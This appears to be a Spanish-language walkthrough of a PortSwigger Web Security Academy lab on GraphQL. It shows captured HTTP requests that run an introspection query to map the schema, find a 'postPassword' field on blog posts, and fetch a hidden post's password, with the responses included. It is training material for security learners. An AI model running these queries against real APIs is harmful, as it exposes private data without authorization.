# Lab 1: Accessing private GraphQL posts

Primero al interceptar trafico detectamos lo siguiente:

```json
POST /graphql/v1 HTTP/2
Host: 0a5b00dd048ba554819aa27700090031.web-security-academy.net
Cookie: session=l1QUxVhFtOE6JMh1Ok6hhctqCXxEqXzd
Content-Length: 165
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Accept: application/json
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Origin: https://0a5b00dd048ba554819aa27700090031.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5b00dd048ba554819aa27700090031.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"query":"\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}","operationName":"getBlogSummaries"}
```

Asi que modificamos el request aprovechando la interaccion con graphql:

{% hint style="info" %}
La introspección en GraphQL es una característica inherente que permite a los clientes consultar el esquema del servidor GraphQL para descubrir los tipos de datos disponibles, así como las consultas, mutaciones y sus respectivos campos. Este mecanismo es una parte fundamental del diseño de GraphQL y facilita a los desarrolladores entender y explorar las capacidades de una API GraphQL.

La introspección se origina como una solución a la falta de documentación dinámica en las API tradicionales. En REST, los desarrolladores deben confiar en documentación externa o comentarios en el código para comprender las rutas y los formatos de datos disponibles. GraphQL, por su diseño, incluye un sistema de introspección que permite a los clientes obtener esta información directamente del servidor, mejorando la autodescripción y la usabilidad de la API.
{% endhint %}

```json
POST /graphql/v1 HTTP/2
Host: 0a5b00dd048ba554819aa27700090031.web-security-academy.net
Cookie: session=l1QUxVhFtOE6JMh1Ok6hhctqCXxEqXzd
Content-Length: 48
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Accept: application/json
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Origin: https://0a5b00dd048ba554819aa27700090031.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5b00dd048ba554819aa27700090031.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"query":"{__schema{types{name,fields{name}}}}"}
```

Lo anterior responde asi:

```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4231

{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "image"
            },
            {
              "name": "title"
            },
            {
              "name": "author"
            },
            {
              "name": "date"
            },
            {
              "name": "summary"
            },
            {
              "name": "paragraphs"
            },
            {
              "name": "isPrivate"
            },
            {
              "name": "postPassword"
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isRepeatable"
            },
            {
              "name": "locations"
            },
            {
              "name": "args"
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "args"
            },
            {
              "name": "type"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "type"
            },
            {
              "name": "defaultValue"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description"
            },
            {
              "name": "types"
            },
            {
              "name": "queryType"
            },
            {
              "name": "mutationType"
            },
            {
              "name": "directives"
            },
            {
              "name": "subscriptionType"
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind"
            },
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "fields"
            },
            {
              "name": "interfaces"
            },
            {
              "name": "possibleTypes"
            },
            {
              "name": "enumValues"
            },
            {
              "name": "inputFields"
            },
            {
              "name": "ofType"
            },
            {
              "name": "specifiedByURL"
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost"
            },
            {
              "name": "getAllBlogPosts"
            }
          ]
        }
      ]
    }
  }
}
```

La respuesta revela el esquema del servidor, incluyendo los tipos `BlogPost` y sus campos, como `id`, `image`, `title`, `author`, `date`, `summary`, `paragraphs`, `isPrivate` y `postPassword`.

Con la información obtenida del esquema, un ethical hacker puede construir peticiones dirigidas a explotar funcionalidades específicas. Por ejemplo, se ha identificado que el tipo `BlogPost` tiene un campo `postPassword`.

```json
POST /graphql/v1 HTTP/2
Host: 0a5b00dd048ba554819aa27700090031.web-security-academy.net
Cookie: session=l1QUxVhFtOE6JMh1Ok6hhctqCXxEqXzd
Content-Length: 45
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Accept: application/json
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Origin: https://0a5b00dd048ba554819aa27700090031.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5b00dd048ba554819aa27700090031.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"query":"{getBlogPost(id:3){postPassword}}"}
```

Lo anterior da como resultado:

```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 103

{
  "data": {
    "getBlogPost": {
      "postPassword": "5m6by17czqhn404zbh5lq3nszn25ptoi"
    }
  }
}
```
